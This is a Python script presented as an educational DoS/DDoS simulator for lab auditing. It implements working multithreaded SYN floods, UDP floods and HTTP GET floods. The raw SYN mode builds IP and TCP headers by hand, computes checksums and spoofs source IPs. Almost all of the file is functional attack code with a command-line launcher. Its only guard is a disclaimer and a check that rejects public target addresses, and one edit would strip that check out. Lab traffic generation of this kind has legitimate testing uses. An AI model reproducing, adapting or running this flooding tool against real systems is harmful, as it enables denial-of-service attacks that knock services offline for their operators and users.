#!/usr/bin/env python3
"""
DoS/DDoS Attack Simulator (Educational & Lab Auditing Tool)
Simulates SYN Floods, UDP Floods, and HTTP GET Floods under strict safety constraints.
Forces private subnet targeting to prevent accidental internet-facing abuse.
"""

import os
import sys
import time
import socket
import random
import struct
import threading
import ipaddress

# ANSI Terminal Colors
CLR_RESET = "\033[0m"
CLR_BOLD = "\033[1m"
CLR_RED = "\033[31m"
CLR_GREEN = "\033[32m"
CLR_YELLOW = "\033[33m"
CLR_CYAN = "\033[36m"

# Educational Disclaimer & Safety Agreement
DISCLAIMER = f"""
{CLR_RED}{CLR_BOLD}======================================================================
                     EDUCATIONAL SECURITY DISCLAIMER
======================================================================{CLR_RESET}
This script is designed for authorized academic research, cybersecurity 
demonstrations, and virtual laboratory audits ONLY. Unsanctioned use of DoS 
tools on public or unauthorized networks is illegal under the Computer Fraud 
and Abuse Act (CFAA) and equivalent international laws.

To ensure safety, this utility will {CLR_BOLD}REJECT{CLR_RESET} public internet targets 
by default, allowing traffic generation ONLY toward private loopback 
or RFC 1918 subnets (e.g. 127.0.0.1, 192.168.x.x, 10.x.x.x, 172.16.x.x).
======================================================================
"""

class AttackGenerator:
    def __init__(self, target, port, method, rate_limit=None, threads=4):
        self.target = target
        self.port = port
        self.method = method.upper()
        self.rate_limit = rate_limit  # PPS limit if set
        self.threads = threads
        self.is_running = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.lock = threading.Lock()

        # Validate Target Safety
        self._verify_target_safety()

    def _verify_target_safety(self):
        """Checks if the target IP lies within a private RFC 1918 or local space."""
        try:
            ip = socket.gethostbyname(self.target)
            ip_obj = ipaddress.ip_address(ip)
            if not (ip_obj.is_private or ip_obj.is_loopback):
                print(f"{CLR_RED}{CLR_BOLD}[SAFETY BLOCK]{CLR_RESET} Target '{self.target}' ({ip}) is a public internet address.")
                print("Accidental internet attacks are blocked. Select a target in your local lab subnet.")
                sys.exit(1)
            self.target_ip = ip
        except socket.gaierror:
            print(f"{CLR_RED}[ERROR]{CLR_RESET} Target host '{self.target}' could not be resolved.")
            sys.exit(1)

    def _get_random_payload(self, size):
        """Generates random bytes for packet body."""
        return os.urandom(size)

    def _udp_flood_worker(self):
        """Worker thread to run a UDP flood."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = self._get_random_payload(512)  # 512-byte payload standard
        
        while self.is_running:
            try:
                # Randomize port slightly if port 0 is given, otherwise use target port
                target_port = self.port if self.port > 0 else random.randint(1024, 65535)
                sock.sendto(payload, (self.target_ip, target_port))
                
                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += len(payload) + 28  # Adding IP/UDP header estimate
                
                if self.rate_limit:
                    time.sleep(self.threads / self.rate_limit)
            except Exception:
                continue

    def _http_flood_worker(self):
        """Worker thread to execute an HTTP GET flood."""
        headers = (
            "GET / HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            "Connection: keep-alive\r\n\r\n"
        ).encode('utf-8')

        while self.is_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2.0)
                sock.connect((self.target_ip, self.port or 80))
                
                sock.sendall(headers)
                # Receive a tiny bit of response or just close
                sock.recv(1024)
                sock.close()
                
                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += len(headers)
                
                if self.rate_limit:
                    time.sleep(self.threads / self.rate_limit)
            except Exception:
                continue

    def _syn_flood_worker_raw(self):
        """Worker thread to perform raw TCP SYN Floods (Requires Linux root)."""
        try:
            # Create a raw socket to build custom packets
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print(f"[{CLR_RED}PERM ERROR{CLR_RESET}] Raw socket SYN flood requires administrative/root privileges.")
            print("Falling back to TCP Standard Connection flood simulator.")
            self._syn_flood_worker_socket()
            return
        except Exception as e:
            print(f"[{CLR_RED}SOCKET ERROR{CLR_RESET}] Raw sockets unavailable: {e}. Falling back...")
            self._syn_flood_worker_socket()
            return

        target_port = self.port if self.port > 0 else 80

        while self.is_running:
            try:
                # Spoof source IP randomly (within RFC 1918)
                src_ip = f"10.0.2.{random.randint(2, 254)}"
                src_port = random.randint(1024, 65535)
                
                # IP Header Construction
                ip_ver = 4
                ip_ihl = 5
                ip_tos = 0
                ip_tot_len = 0  # Kernel auto-calculates length
                ip_id = random.randint(1000, 65535)
                ip_frag_off = 0
                ip_ttl = 64
                ip_proto = socket.IPPROTO_TCP
                ip_check = 0
                ip_saddr = socket.inet_aton(src_ip)
                ip_daddr = socket.inet_aton(self.target_ip)
                
                ip_ver_ihl = (ip_ver << 4) + ip_ihl
                ip_header = struct.pack('!BBHHHBBH4s4s', ip_ver_ihl, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

                # TCP Header Construction (SYN Flag set)
                tcp_seq = random.randint(0, 4294967295)
                tcp_ack_seq = 0
                tcp_doff = 5
                
                # TCP Flags
                tcp_fin = 0
                tcp_syn = 1
                tcp_rst = 0
                tcp_psh = 0
                tcp_ack = 0
                tcp_urg = 0
                tcp_window = socket.htons(5840)
                tcp_check = 0
                tcp_urg_ptr = 0
                
                tcp_offset_res = (tcp_doff << 4) + 0
                tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
                
                tcp_header = struct.pack('!HHLLBBHHH', src_port, target_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)

                # Pseudo header for TCP Checksum calculation
                placeholder = 0
                protocol = socket.IPPROTO_TCP
                tcp_length = len(tcp_header)
                psh = struct.pack('!4s4sBBH', ip_saddr, ip_daddr, placeholder, protocol, tcp_length)
                psh = psh + tcp_header

                # Compute checksum
                def checksum(msg):
                    s = 0
                    for i in range(0, len(msg), 2):
                        if i + 1 < len(msg):
                            w = (msg[i] << 8) + (msg[i+1])
                        else:
                            w = (msg[i] << 8) + 0
                        s = s + w
                    s = (s >> 16) + (s & 0xffff)
                    s = s + (s >> 16)
                    s = ~s & 0xffff
                    return s

                tcp_check = checksum(psh)
                # Re-pack TCP Header with correct checksum
                tcp_header = struct.pack('!HHLLBBH', src_port, target_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window) + struct.pack('!H', tcp_check) + struct.pack('!H', tcp_urg_ptr)

                packet = ip_header + tcp_header
                s.sendto(packet, (self.target_ip, 0))

                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += len(packet)

                if self.rate_limit:
                    time.sleep(self.threads / self.rate_limit)
            except Exception:
                continue

    def _syn_flood_worker_socket(self):
        """Fallback TCP connection builder for user-space (non-root) testing."""
        target_port = self.port if self.port > 0 else 80
        while self.is_running:
            try:
                # Initiate non-blocking connection to simulate half-open or fast TCP attempts
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(False)
                # This will initiate a SYN, but we immediately close it or dump it, simulating flood
                sock.connect_ex((self.target_ip, target_port))
                sock.close()
                
                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += 64  # Estimated TCP handshake overhead

                if self.rate_limit:
                    time.sleep(self.threads / self.rate_limit)
            except Exception:
                continue

    def start(self):
        """Spawns worker threads to begin generating network traffic."""
        self.is_running = True
        self.start_time = time.time()
        self.threads_list = []

        print(f"\n{CLR_GREEN}✔ Commencing attack simulation:{CLR_RESET}")
        print(f"  * Target:     {CLR_BOLD}{self.target}{CLR_RESET} ({self.target_ip})")
        print(f"  * Port:       {CLR_BOLD}{self.port or 'Dynamic'}{CLR_RESET}")
        print(f"  * Method:     {CLR_BOLD}{self.method}{CLR_RESET}")
        print(f"  * Threads:    {CLR_BOLD}{self.threads}{CLR_RESET}")
        print(f"  * PPS Limit:  {CLR_BOLD}{self.rate_limit or 'UNLIMITED'}{CLR_RESET}")
        print(f"Press {CLR_YELLOW}Ctrl+C{CLR_RESET} at any time to terminate traffic generation.")
        print(f"----------------------------------------------------------------------")

        # Choose worker callback based on method
        if self.method == "UDP":
            worker_target = self._udp_flood_worker
        elif self.method == "HTTP":
            worker_target = self._http_flood_worker
        elif self.method == "SYN":
            # Auto-detect raw socket capability or use fallback
            if sys.platform.startswith("linux") and os.geteuid() == 0:
                worker_target = self._syn_flood_worker_raw
            else:
                print("Running without Linux root. Using socket-level connect flood simulator.")
                worker_target = self._syn_flood_worker_socket
        else:
            print(f"{CLR_RED}[ERROR]{CLR_RESET} Unsupported traffic generation method: {self.method}")
            sys.exit(1)

        # Spawn Threads
        for _ in range(self.threads):
            t = threading.Thread(target=worker_target)
            t.daemon = True
            t.start()
            self.threads_list.append(t)

        # Monitoring Loop
        try:
            while self.is_running:
                time.sleep(1.0)
                elapsed = time.time() - self.start_time
                with self.lock:
                    pps = self.packets_sent / elapsed if elapsed > 0 else 0
                    kbps = (self.bytes_sent * 8) / (1024 * elapsed) if elapsed > 0 else 0
                    print(f"  ⚡ Running... Sent: {self.packets_sent:>6} pkts | Data: {self.bytes_sent/1024/1024:>6.2f} MB | {pps:>7.1f} PPS | {kbps:>8.2f} Kbps", end="\r")
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """Stops all threads."""
        self.is_running = False
        print(f"\n\n{CLR_GREEN}✔ Stopping attack generator threads...{CLR_RESET}")
        for t in self.threads_list:
            t.join(timeout=1.0)
        elapsed = time.time() - self.start_time
        print(f"----------------------------------------------------------------------")
        print(f"Simulation completed:")
        print(f"  * Total Packets Sent: {CLR_BOLD}{self.packets_sent}{CLR_RESET}")
        print(f"  * Total Data Transferred: {CLR_BOLD}{self.bytes_sent/1024/1024:.2f} MB{CLR_RESET}")
        print(f"  * Run Duration: {CLR_BOLD}{elapsed:.1f}s{CLR_RESET}")
        print(f"======================================================================")

if __name__ == "__main__":
    print(DISCLAIMER)
    
    import argparse
    parser = argparse.ArgumentParser(description="Multi-threaded Network Traffic Generator for Security Auditing")
    parser.add_argument("target", help="Target IP or Domain (Must be RFC1918 / Local loopback)")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target Port (e.g. 80 for HTTP, 53 for UDP, default: 80)")
    parser.add_argument("-m", "--method", choices=["syn", "udp", "http"], default="syn", 
                        help="Attack vectors: syn (SYN flood), udp (UDP flood), http (HTTP GET flood)")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Number of concurrent worker threads (default: 4)")
    parser.add_argument("-r", "--rate", type=int, help="Total rate limit in Packets Per Second (PPS)")
    
    args = parser.parse_args()

    generator = AttackGenerator(
        target=args.target,
        port=args.port,
        method=args.method,
        rate_limit=args.rate,
        threads=args.threads
    )
    generator.start()
